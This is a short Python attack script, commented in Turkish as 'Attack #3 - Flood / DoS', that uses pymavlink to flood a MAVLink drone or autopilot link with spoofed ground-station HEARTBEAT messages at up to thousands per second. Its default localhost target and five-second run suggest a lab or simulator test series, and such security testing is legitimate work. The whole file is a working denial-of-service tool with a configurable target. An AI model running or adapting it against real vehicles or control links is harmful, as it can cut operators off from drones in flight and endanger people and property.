#!/usr/bin/env python3
"""Saldiri #3 - Flood / DoS. Yuksek hizda HEARTBEAT ile kanali bogar."""
import argparse
import socket
import time

from pymavlink.dialects.v20 import common as mavlink2

FLOOD_SYSID = 255
FLOOD_COMPID = 200


class UDPSender:
    def __init__(self, host, port, sysid, compid):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(("0.0.0.0", 0))
        self.addr = (host, int(port))
        self.mav = mavlink2.MAVLink(self, srcSystem=sysid, srcComponent=compid)

    def write(self, data):
        self.sock.sendto(data, self.addr)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:14560")
    ap.add_argument("--rate", type=int, default=2000)
    ap.add_argument("--duration", type=float, default=5.0)
    args = ap.parse_args()

    host, port = args.target.split(":")
    s = UDPSender(host, port, FLOOD_SYSID, FLOOD_COMPID)
    print(f"[saldiri] FLOOD -> {args.target} | ~{args.rate} msg/s, {args.duration}s")
    period = 1.0 / args.rate if args.rate > 0 else 0
    t0 = time.time()
    n = 0
    while time.time() - t0 < args.duration:
        s.mav.heartbeat_send(
            mavlink2.MAV_TYPE_GCS, mavlink2.MAV_AUTOPILOT_INVALID, 0, 0,
            mavlink2.MAV_STATE_ACTIVE,
        )
        n += 1
        if period:
            time.sleep(period)
    dt = time.time() - t0
    print(f"[saldiri] tamam. {n} paket / {dt:.1f}s = {int(n / dt)} msg/s")


if __name__ == "__main__":
    main()